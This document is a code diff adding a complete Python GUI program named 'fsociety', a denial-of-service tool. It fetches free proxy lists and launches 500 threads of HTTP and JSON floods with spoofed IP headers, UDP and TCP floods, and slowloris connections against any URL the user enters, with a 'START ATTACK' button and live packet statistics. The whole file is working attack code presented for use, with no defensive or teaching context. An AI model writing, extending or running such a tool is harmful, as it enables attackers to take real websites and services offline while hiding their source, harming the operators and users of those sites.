@@ -1,1 +1,533 @@
+import sys
+import requests
+import random
+import re
+import itertools
+import time
+import socket
+import ssl
+import hashlib
+import os
+import threading
+import json
+from PyQt5.QtWidgets import (
+    QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, QWidget, QLabel,
+    QLineEdit, QPushButton, QMessageBox, QTextEdit, QCheckBox
+)
+from PyQt5.QtGui import QPixmap
+from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer
+from io import BytesIO
+import urllib.parse
 
+UserAgents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0",
+]
+
+ip_list_urls = [
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+]
+
+class AttackThread(QThread):
+    log_signal = pyqtSignal(str)
+    stats_signal = pyqtSignal(dict)
+    
+    def __init__(self, target_url, num_requests, threads=500, use_proxy=True):
+        super().__init__()
+        self.target_url = target_url
+        self.num_requests = num_requests
+        self.threads = threads
+        self.use_proxy = use_proxy
+        self.is_running = True
+        
+        self.success_count = 0
+        self.fail_count = 0
+        self.total_bytes = 0
+        self.lock = threading.Lock()
+        self.start_time = 0
+        
+        self.real_ip = self.get_real_ip()
+        
+        try:
+            self.parsed_url = urllib.parse.urlparse(target_url)
+            self.host = self.parsed_url.netloc.split(':')[0]
+            self.path = self.parsed_url.path or "/"
+            self.use_ssl = self.parsed_url.scheme == "https"
+            self.port = 443 if self.use_ssl else 80
+            self.target_ip = socket.gethostbyname(self.host)
+        except:
+            self.target_ip = target_url
+            self.host = target_url
+
+    def get_real_ip(self):
+        try:
+            response = requests.get('https://api.ipify.org', timeout=5)
+            return response.text.strip()
+        except:
+            try:
+                response = requests.get('https://httpbin.org/ip', timeout=5)
+                return response.json()['origin']
+            except:
+                return "127.0.0.1"
+
+    def add_success(self, bytes_sent=0):
+        with self.lock:
+            self.success_count += 1
+            self.total_bytes += bytes_sent
+    
+    def add_fail(self):
+        with self.lock:
+            self.fail_count += 1
+
+    def get_stats(self):
+        with self.lock:
+            return self.success_count, self.fail_count, self.total_bytes
+
+    def get_proxies_sync(self):
+        proxies = []
+        if not self.use_proxy:
+            return []
+            
+        self.log_signal.emit(f"[+] Loading proxies...")
+        for url in ip_list_urls[:3]:
+            try:
+                response = requests.get(url, timeout=5)
+                found = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", response.text)
+                proxies.extend(found[:50])
+            except:
+                pass
+        
+        proxies = list(set(proxies))[:200]
+        self.log_signal.emit(f"[+] Loaded {len(proxies)} proxies")
+        return proxies
+
+    def send_json_flood(self, proxy=None):
+        random_path = f"/{hashlib.md5(os.urandom(8)).hexdigest()[:random.randint(8,32)]}"
+        fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+        
+        json_payloads = [
+            {"data": os.urandom(random.randint(100, 500)).hex(), "timestamp": time.time(), "id": random.randint(1000, 9999)},
+            {"query": "mutation { createUser(name: \"" + "A" * 500 + "\") { id } }", "variables": {}},
+            {"username": "A" * 1000, "password": "B" * 1000, "email": "test@test.com"},
+            {"message": "A" * 2000, "channel": "general", "type": "text"},
+            {"content": "X" * 1500, "attachments": [], "nonce": str(random.randint(100000, 999999))},
+            {"operationName": "test", "variables": {"input": "A" * 800}, "query": "query test($input: String!) { test(input: $input) { result } }"},
+            {"jsonrpc": "2.0", "method": "test", "params": ["A" * 1000], "id": random.randint(1, 9999)},
+            {"data": {"field1": "A" * 300, "field2": "B" * 300, "field3": "C" * 300, "array": ["x" * 100 for _ in range(10)]}}
+        ]
+        
+        payload = random.choice(json_payloads)
+        json_data = json.dumps(payload)
+        
+        headers = {
+            "User-Agent": random.choice(UserAgents),
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Cache-Control": "no-cache",
+            "Content-Type": "application/json",
+            "Content-Length": str(len(json_data)),
+            "X-Forwarded-For": fake_ip,
+            "X-Real-IP": fake_ip,
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": f"http://{self.host}/"
+        }
+        
+        for _ in range(random.randint(5, 15)):
+            headers[f"X-{random.randint(100,999)}"] = hashlib.md5(os.urandom(8)).hexdigest()[:12]
+        
+        params = "?" + "&".join(f"{random.randint(1000,9999)}={hashlib.md5(os.urandom(4)).hexdigest()[:8]}" for _ in range(random.randint(5, 15)))
+        url = f"{self.target_url}{random_path}{params}"
+        
+        try:
+            if proxy and self.use_proxy:
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                response = requests.post(url, headers=headers, data=json_data, proxies=proxies, timeout=2, verify=False)
+            else:
+                response = requests.post(url, headers=headers, data=json_data, timeout=2, verify=False)
+            return True, len(json_data) + len(str(response.content)), response.status_code
+        except:
+            return False, 0, 0
+
+    def send_http_flood(self, proxy=None):
+        random_path = f"/{hashlib.md5(os.urandom(8)).hexdigest()[:random.randint(8,32)]}"
+        fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+        
+        headers = {
+            "User-Agent": random.choice(UserAgents),
+            "Accept": "*/*",
+            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Cache-Control": "no-cache",
+            "Pragma": "no-cache",
+            "X-Forwarded-For": fake_ip,
+            "X-Real-IP": fake_ip,
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": f"http://{self.host}/"
+        }
+        
+        for _ in range(random.randint(5, 15)):
+            headers[f"X-{random.randint(100,999)}"] = hashlib.md5(os.urandom(8)).hexdigest()[:12]
+        
+        params = "?" + "&".join(f"{random.randint(1000,9999)}={hashlib.md5(os.urandom(4)).hexdigest()[:8]}" for _ in range(random.randint(5, 15)))
+        url = f"{self.target_url}{random_path}{params}"
+        
+        try:
+            if proxy and self.use_proxy:
+                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                response = requests.get(url, headers=headers, proxies=proxies, timeout=2, verify=False)
+            else:
+                response = requests.get(url, headers=headers, timeout=2, verify=False)
+            return True, len(response.content), response.status_code
+        except:
+            return False, 0, 0
+
+    def send_udp_flood(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
+            
+            size = random.randint(1024, 4096)
+            payload = os.urandom(size)
+            sock.sendto(payload, (self.target_ip, self.port))
+            sock.close()
+            return True, size, 200
+        except:
+            return False, 0, 0
+
+    def send_tcp_flood(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.settimeout(1)
+            sock.connect((self.target_ip, self.port))
+            
+            if self.use_ssl:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = context.wrap_socket(sock, server_hostname=self.host)
+            
+            garbage = os.urandom(random.randint(256, 1024))
+            sock.send(garbage)
+            sock.close()
+            return True, len(garbage), 200
+        except:
+            return False, 0, 0
+
+    def send_slowloris(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((self.target_ip, self.port))
+            
+            request = f"GET {self.path}?{random.randint(1000,9999)} HTTP/1.1\r\n"
+            request += f"Host: {self.host}\r\n"
+            request += f"User-Agent: {random.choice(UserAgents)}\r\n"
+            request += "Accept: */*\r\n"
+            request += "Connection: keep-alive\r\n"
+            request += "Keep-Alive: 300\r\n"
+            sock.send(request.encode())
+            
+            for i in range(random.randint(5, 15)):
+                sock.send(f"X-Header-{i}: {hashlib.md5(os.urandom(4)).hexdigest()[:8]}\r\n".encode())
+                time.sleep(random.uniform(0.05, 0.1))
+            
+            sock.close()
+            return True, 200, 200
+        except:
+            return False, 0, 0
+
+    def worker(self, proxy_list, worker_id):
+        proxy_cycle = itertools.cycle(proxy_list) if proxy_list else None
+        sent = 0
+        local_success = 0
+        
+        while self.is_running and sent < (self.num_requests // self.threads):
+            method = random.choice(["json", "http", "udp", "tcp", "slowloris"])
+            
+            try:
+                if method == "json":
+                    proxy = next(proxy_cycle) if proxy_cycle else None
+                    success, bytes_sent, status = self.send_json_flood(proxy)
+                    method_name = "JSON"
+                elif method == "http":
+                    proxy = next(proxy_cycle) if proxy_cycle else None
+                    success, bytes_sent, status = self.send_http_flood(proxy)
+                    method_name = "HTTP"
+                elif method == "udp":
+                    success, bytes_sent, status = self.send_udp_flood()
+                    method_name = "UDP"
+                elif method == "tcp":
+                    success, bytes_sent, status = self.send_tcp_flood()
+                    method_name = "TCP"
+                else:
+                    success, bytes_sent, status = self.send_slowloris()
+                    method_name = "SLOW"
+                
+                if success:
+                    self.add_success(bytes_sent)
+                    local_success += 1
+                    if local_success % 10 == 0:
+                        current_total, _, _ = self.get_stats()
+                        if self.use_proxy and proxy:
+                            self.log_signal.emit(f"[{self.real_ip}] -> [{proxy}] -> {self.target_ip}:{self.port} | Status: {status} | Packets: {current_total} | {method_name}")
+                        else:
+                            self.log_signal.emit(f"[{self.real_ip}] -> {self.target_ip}:{self.port} | Status: {status} | Packets: {current_total} | {method_name}")
+                else:
+                    self.add_fail()
+                sent += 1
+            except:
+                self.add_fail()
+                sent += 1
+
+    def run(self):
+        self.start_time = time.time()
+        self.log_signal.emit(f"\n{'='*70}")
+        self.log_signal.emit(f"[!] YOUR REAL IP: {self.real_ip}")
+        self.log_signal.emit(f"[!] TARGET: {self.target_url} ({self.target_ip}:{self.port})")
+        self.log_signal.emit(f"[!] ATTACK METHOD: JSON/HTTP/UDP/TCP/SLOWLORIS")
+        self.log_signal.emit(f"[!] THREADS: {self.threads}")
+        self.log_signal.emit(f"[!] PROXY: {'ON (IP HIDDEN)' if self.use_proxy else 'OFF (YOUR IP VISIBLE)'}")
+        self.log_signal.emit(f"{'='*70}\n")
+        
+        proxies = self.get_proxies_sync() if self.use_proxy else []
+        
+        self.log_signal.emit(f"[+] Starting attack...\n")
+        
+        workers = []
+        for i in range(self.threads):
+            t = threading.Thread(target=self.worker, args=(proxies, i))
+            t.daemon = True
+            t.start()
+            workers.append(t)
+        
+        last_success = 0
+        last_time = self.start_time
+        last_log_time = self.start_time
+        
+        while self.is_running and any(w.is_alive() for w in workers):
+            time.sleep(1)
+            elapsed = time.time() - self.start_time
+            success, fail, total_bytes = self.get_stats()
+            
+            rate = (success - last_success) / (time.time() - last_time) if time.time() > last_time else 0
+            avg_rate = success / elapsed if elapsed > 0 else 0
+            
+            self.stats_signal.emit({
+                'sent': success,
+                'failed': fail,
+                'rate': rate,
+                'avg_rate': avg_rate,
+                'elapsed': elapsed,
+                'bytes_mb': total_bytes / 1024 / 1024
+            })
+            
+            if int(elapsed) % 5 == 0 and elapsed > 0 and elapsed > last_log_time + 4:
+                self.log_signal.emit(f"\n[STATS] Total Packets: {success} | Failed: {fail} | Speed: {rate:.0f}/s | Avg: {avg_rate:.0f}/s | Data: {total_bytes/1024/1024:.1f}MB")
+                last_log_time = elapsed
+            
+            last_success = success
+            last_time = time.time()
+        
+        for w in workers:
+            w.join(timeout=1)
+        
+        elapsed = time.time() - self.start_time
+        success, fail, total_bytes = self.get_stats()
+        final_rate = success / elapsed if elapsed > 0 else 0
+        
+        self.log_signal.emit(f"\n{'='*70}")
+        self.log_signal.emit(f"[+] ATTACK COMPLETED!")
+        self.log_signal.emit(f"[+] YOUR IP: {self.real_ip}")
+        self.log_signal.emit(f"[+] TARGET: {self.target_ip}:{self.port}")
+        self.log_signal.emit(f"[+] Total packets sent: {success}")
+        self.log_signal.emit(f"[+] Failed: {fail}")
+        self.log_signal.emit(f"[+] Success rate: {success/(success+fail)*100 if (success+fail) > 0 else 0:.1f}%")
+        self.log_signal.emit(f"[+] Average rate: {final_rate:.0f} p/s")
+        self.log_signal.emit(f"[+] Total data: {total_bytes/1024/1024:.2f} MB")
+        self.log_signal.emit(f"[+] Duration: {elapsed:.2f} seconds")
+        self.log_signal.emit(f"{'='*70}")
+        
+        self.stats_signal.emit({
+            'sent': success,
+            'failed': fail,
+            'rate': 0,
+            'avg_rate': final_rate,
+            'elapsed': elapsed,
+            'bytes_mb': total_bytes / 1024 / 1024
+        })
+
+    def stop(self):
+        self.is_running = False
+
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("fsociety")
+        self.setGeometry(200, 200, 700, 800)
+        self.setStyleSheet("background-color: #191919; color: white;")
+
+        central_widget = QWidget()
+        self.setCentralWidget(central_widget)
+
+        layout = QVBoxLayout()
+
+        self.log_output = QTextEdit()
+        self.log_output.setReadOnly(True)
+        self.log_output.setStyleSheet("background-color: #0a0a0a; color: #00ff00; font-family: monospace; font-size: 11px;")
+        layout.addWidget(self.log_output)
+
+        self.image_label = QLabel()
+        self.image_label.setAlignment(Qt.AlignCenter)
+        self.image_label.setStyleSheet("background-color: #191919;")
+        layout.addWidget(self.image_label)
+        
+        try:
+            image_url = "https://i.pinimg.com/736x/30/b9/46/30b94658f685ffd183c8c442d2973d30.jpg"
+            response = requests.get(image_url, timeout=5)
+            pixmap = QPixmap()
+            pixmap.loadFromData(response.content)
+            self.image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio))
+        except:
+            pass
+
+        self.url_label = QLabel("Target URL:")
+        self.url_label.setAlignment(Qt.AlignCenter)
+        layout.addWidget(self.url_label, alignment=Qt.AlignCenter)
+
+        self.url_input = QLineEdit()
+        self.url_input.setFixedWidth(350)
+        self.url_input.setPlaceholderText("http://example.com")
+        self.url_input.setStyleSheet("background-color: #2a2a2a; color: white; border: 1px solid #ff4444; padding: 5px;")
+        layout.addWidget(self.url_input, alignment=Qt.AlignCenter)
+
+        self.requests_label = QLabel("Number of Packets:")
+        self.requests_label.setAlignment(Qt.AlignCenter)
+        layout.addWidget(self.requests_label)
+
+        self.requests_input = QLineEdit()
+        self.requests_input.setFixedWidth(350)
+        self.requests_input.setText("50000")
+        self.requests_input.setStyleSheet("background-color: #2a2a2a; color: white; border: 1px solid #ff4444; padding: 5px;")
+        layout.addWidget(self.requests_input, alignment=Qt.AlignCenter)
+
+        checkbox_layout = QHBoxLayout()
+        self.proxy_checkbox = QCheckBox("Use Proxies (Hide IP)")
+        self.proxy_checkbox.setChecked(False)
+        self.proxy_checkbox.setStyleSheet("color: #ff4444; margin: 10px;")
+        checkbox_layout.addStretch()
+        checkbox_layout.addWidget(self.proxy_checkbox)
+        checkbox_layout.addStretch()
+        layout.addLayout(checkbox_layout)
+
+        self.start_button = QPushButton("START ATTACK")
+        self.start_button.setFixedWidth(200)
+        self.start_button.clicked.connect(self.start_attack)
+        self.start_button.setStyleSheet("""
+            QPushButton {
+                background-color: #ff4444;
+                color: white;
+                border: none;
+                padding: 12px;
+                border-radius: 5px;
+                font-weight: bold;
+                font-size: 14px;
+            }
+            QPushButton:hover {
+                background-color: #ff6666;
+            }
+            QPushButton:disabled {
+                background-color: #666666;
+            }
+        """)
+        layout.addWidget(self.start_button, alignment=Qt.AlignCenter)
+
+        self.stats_label = QLabel("Status: Ready")
+        self.stats_label.setAlignment(Qt.AlignCenter)
+        self.stats_label.setStyleSheet("color: #ff8888; font-family: monospace; font-size: 12px; margin: 10px;")
+        layout.addWidget(self.stats_label)
+
+        central_widget.setLayout(layout)
+        
+        self.attack_thread = None
+
+    def log_message(self, message):
+        self.log_output.append(message)
+        cursor = self.log_output.textCursor()
+        cursor.movePosition(cursor.End)
+        self.log_output.setTextCursor(cursor)
+
+    def update_stats(self, stats):
+        sent = stats['sent']
+        failed = stats['failed']
+        rate = stats['rate']
+        avg_rate = stats['avg_rate']
+        bytes_mb = stats['bytes_mb']
+        
+        if sent == 0:
+            self.stats_label.setText(f"Status: {sent} packets | Speed: {rate:.0f}/s | Initializing")
+        else:
+            self.stats_label.setText(
+                f"Status: {sent} packets | Failed: {failed} | "
+                f"Speed: {rate:.0f}/s | Avg: {avg_rate:.0f}/s | Data: {bytes_mb:.1f} MB"
+            )
+
+    def start_attack(self):
+        target_url = self.url_input.text().strip()
+        
+        try:
+            num_requests = int(self.requests_input.text())
+        except ValueError:
+            QMessageBox.critical(self, "Error", "Number of packets must be an integer.")
+            return
+
+        if not target_url or num_requests <= 0:
+            QMessageBox.critical(self, "Error", "Please provide a valid URL and number of packets.")
+            return
+
+        if not target_url.startswith(('http://', 'https://')):
+            target_url = 'http://' + target_url
+
+        use_proxy = self.proxy_checkbox.isChecked()
+
+        self.log_output.clear()
+        
+        self.attack_thread = AttackThread(target_url, num_requests, threads=500, use_proxy=use_proxy)
+        self.attack_thread.log_signal.connect(self.log_message)
+        self.attack_thread.stats_signal.connect(self.update_stats)
+        self.attack_thread.start()
+        
+        self.start_button.setEnabled(False)
+        self.start_button.setText("ATTACK IN PROGRESS")
+        
+        def enable_button():
+            self.start_button.setEnabled(True)
+            self.start_button.setText("START ATTACK")
+        
+        QTimer.singleShot(num_requests // 5 + 10000, enable_button)
+
+if __name__ == "__main__":
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    
+    app = QApplication(sys.argv)
+    window = MainWindow()
+    window.show()
+    sys.exit(app.exec_())
